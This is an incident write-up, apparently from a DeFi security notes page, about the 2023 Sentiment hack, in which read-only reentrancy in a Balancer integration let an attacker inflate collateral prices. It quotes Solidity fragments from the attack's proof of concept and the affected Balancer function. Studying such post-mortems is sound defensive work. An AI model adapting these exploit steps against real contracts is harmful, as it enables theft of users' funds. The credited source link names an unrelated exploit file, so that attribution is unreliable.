# Sentiment


## What's Sentiment?


## Amount stolen
**$1M USD**

March 3,2023

## Vulnerability
Read-Only-Reentrancy

Balancer integration


## Analysis
The attacker used view re-entrance Balancer bug to execute malicious code before pool balances were updated and steal money using overpriced collateral

Reentrant attacks in read-only mode occur when a view function is initially called and later reentered by another function that alters the contract's state.
This vulnerability can be exploited by manipulating the values used in functions dependent on the returned results, leading to potential rate manipulation or incorrect parsing.

// A reentrancy attack occurs when a smart contract fails to update its state before sending funds. This lets an attacker continuously call the contract’s withdraw function to drain funds.





```solidity
 uint256[] memory amountIn = new uint256[](3);
        amountIn[0] = 0;
        amountIn[1] = 50 * 1e18;
        amountIn[2] = 0;
        bytes memory userDatas = abi.encode(uint256(1), amountIn, uint256(0));
        IBalancerVault.JoinPoolRequest memory joinPoolRequest_1 = IBalancerVault.JoinPoolRequest({
            asset: assets,
            maxAmountsIn: amountIn,
            userData: userDatas,
            fromInternalBalance: false
        });
```


```solidity
      bytes memory execData = abi.encodeWithSelector(0xb95cac28, PoolId, account, account, joinPoolRequest_1);
        AccountManager.exec(account, address(Balancer), 0, execData); // deposit 50 WETH
```

### Exploited code

```solidity
    function _joinOrExit(
        PoolBalanceChangeKind kind,
        bytes32 poolId,
        address sender,
        address payable recipient,
        PoolBalanceChange memory change
    ) private nonReentrant withRegisteredPool(poolId) authenticateFor(sender) {

        ** removed non exploit code **

        // The bulk of the work is done here: the corresponding Pool hook is called, its final balances are computed,
        // assets are transferred, and fees are paid.
        (
            bytes32[] memory finalBalances,
            uint256[] memory amountsInOrOut,
            uint256[] memory paidProtocolSwapFeeAmounts
        ) = _callPoolBalanceChange(kind, poolId, sender, recipient, change, balances);


        ** removed non exploit code **
    }
```

# proof of concept (PoC) 

attacker flashloaned 606 WBTC,10_000 ETH and 18 million USDC tokens the from sentiments lending pool

Entry point: _joinOrExit

Whats `_joinOrExit?`

`_joinOrExit` function is called whenever the `joinPool` or `exitPool`





![euler Image](../images/sentiment/Sentiment1.drawio.png)
![euler Image](../images/sentiment/Sentiment2.drawio.png)


**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/88mph_exp.sol)


[**< Back**](https://patronasxdxd.github.io/CTFS/)
